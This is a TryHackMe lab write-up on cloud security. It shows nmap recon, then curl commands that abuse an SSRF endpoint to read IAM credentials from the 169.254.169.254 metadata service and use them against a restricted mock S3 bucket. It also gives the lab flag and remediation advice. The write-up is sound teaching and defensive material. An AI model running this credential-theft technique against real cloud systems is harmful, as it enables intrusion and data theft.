# TryHackMe — Cloud Security Fundamentals (Task 7)

**Room:** https://tryhackme.com/room/cloudsecurityfundamentals
**Task:** Task 7 — Practical, Attacking a Cloud-Like Environment
**Target:** 10.112.150.115
**Date:** 2026-05-28

---

## Summary

The lab simulates an AWS-style environment. A vulnerable `ImageFetcher`
web app on port 8080 exposes a server-side `/fetch?url=` endpoint
(classic SSRF). The instance metadata service (IMDSv1-style) is reachable
from the app at `http://169.254.169.254/`. Pivoting through SSRF we
retrieved temporary IAM credentials for the `web-app-role`, then used
the role's `AccessKeyId` as the `X-Simulated-Token` header against the
mock S3 service on port 9000 to read the restricted `prod-secrets`
bucket and extract the flag.

---

## Recon

```
nmap -sV -sC -T4 10.112.150.115
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu
8080/tcp  open  http       Werkzeug/3.1.8 — ImageFetcher
9000/tcp  open  http       Werkzeug/3.1.8 — S3-like buckets
```

### Port 8080 — ImageFetcher
> Staging service for importing supplier image URLs.
> Usage: `/fetch?url=<target>`

### Port 9000 — mock S3
```
GET /          -> dev-assets/  prod-secrets/
GET /dev-assets/   -> dev-notes.txt, welcome.txt   (public)
GET /prod-secrets/ -> 403 Forbidden: missing or invalid X-Simulated-Token
```

`dev-assets/dev-notes.txt` confirmed:
- imagefetcher on port 8080 with `/fetch?url=` SSRF
- IAM role `web-app-role` attached to the instance, scoped to prod-secrets
  via an admin policy
- Devs noted they still need to rotate the pinned `AccessKeyId`

---

## Exploitation

### 1. SSRF -> IMDS enumeration

```
curl "http://10.112.150.115:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
web-app-role
```

### 2. Steal temporary IAM credentials

```
curl "http://10.112.150.115:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role"
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIATHM1234FAKEKEY0",
  "SecretAccessKey": "fakeSECRET/fakeSECRETKEYsim0lab0web0app0role",
  "Token": "FQoGZXIvYXdzEMn...simulatedTokenStringForTheLab==",
  "Expiration": "2099-12-31T23:59:59Z",
  "RoleArn": "arn:aws:iam::000000000000:role/web-app-role"
}
```

### 3. Use AccessKeyId as the simulated session token

The mock S3 service validates the `X-Simulated-Token` request header
against the leaked AccessKeyId:

```
curl -H "X-Simulated-Token: AKIATHM1234FAKEKEY0" \
     http://10.112.150.115:9000/prod-secrets/
flag.txt

curl -H "X-Simulated-Token: AKIATHM1234FAKEKEY0" \
     http://10.112.150.115:9000/prod-secrets/flag.txt
THM{sh4r3d_r3sp0ns1b1l1ty_br0k3n}
```

---

## Findings / Answers

| Item                                  | Value                                |
| ------------------------------------- | ------------------------------------ |
| Web app vulnerability                 | SSRF (Server-Side Request Forgery)   |
| Internal metadata IP                  | 169.254.169.254                      |
| IAM role attached to the instance     | web-app-role                         |
| Stolen AccessKeyId                    | AKIATHM1234FAKEKEY0                  |
| Restricted bucket                     | prod-secrets                         |
| File holding the flag                 | prod-secrets/flag.txt                |
| **Flag**                              | **THM{sh4r3d_r3sp0ns1b1l1ty_br0k3n}**|

---

## Remediation

- Block server-side request to link-local IMDS from app containers
  (block 169.254.169.254 / use IMDSv2 with hop-limit=1).
- Validate / allowlist URLs in `/fetch` instead of fetching arbitrary
  user input.
- Scope the IAM role to least privilege; remove blanket access to
  prod-secrets from a staging/web role.
- Rotate the long-lived AccessKeyId pinned to the instance — the dev
  notes admitted it was overdue.
- Lock down the `dev-assets` bucket — anonymous reads leaked internal
  architecture and the role name.
